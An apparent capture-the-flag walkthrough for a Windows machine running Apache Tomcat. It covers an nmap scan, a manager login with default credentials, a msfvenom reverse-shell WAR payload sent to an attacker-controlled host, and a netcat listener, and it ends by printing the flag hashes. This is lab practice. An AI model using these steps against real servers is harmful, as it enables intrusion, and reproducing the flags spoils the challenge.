First, we do Nmap scan on the target IP: nmap -v -o -p- {target ip} . This will scan all of the ports while telling us more about the operating system that this ip address belongs to.

Our scan will come up with a tcp port 8080. That means there is a website hosted.

To visit this website, we will search for: {target ip}:8080 in the URL search bar. 

It seams like we have a website that is running on a webserver called Apache Tomcat. 

We will give ourselves sometime to get familiar with the structure of the website. Eventually, we will find a manager page that requires a sing in using username and password. Now, it is time to use BurpSuite.

Unfortunately, BurpSuite can't capture popups so we can't use BurpSuite to brute force the credentials.

That means we have to do that manually, but first we need a set of credentials that might be the right credentials, so we search for default credentials for Apache Tomcat. 

Luckily, we stumble upon this Github repo: https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown 

This repo contains possible default credentials. After trying multiple of them, we get the right set of credentials: tomcat:s3cret

We notice that we have the ability to upload a war file which is a packaged web application that contains files for a web application and is similar to a ZIP or JAR file.

Now, We will search across the internet for what we should do next. We once again stumble upon a great article in HackTricks about how to obtain a reverse shell for Apache Tomcat server. We will be using msfvenom to build a war file for us that we can upload to the webserver. 

we will use msfvenom like so:msfvenom -p java/jsp_shell_reverse_tcp LHOST={our ip address} LPORT={any port we want} -f war -o revshell.war . This will save the payload to a file called revshell.war which we will upload.

Before uploading the file, we need to start netcat listening on the port that we specified earlier: nc -nvlp {port number}. Then we will upload our .war file. 

We will notice that we have a new option to click on in the webserver:/revshell.war which will activate our payload upon clicking on it.

Now, if we went back to netcat, we can see that we now have a reverse shell to the target machine.

If we typed whoami, we will find out that we are already admin, so no priv-esc is required for this machine.

If we go to Users/Administrator/flags, we can find the text file that has both flags for the solution. 

To read the text file: type "name of file" .

user flag: 7004dbcef0f854e0fb401875f26ebd00

admin flag: 04a8b36e1545a455393d067e772fe90e
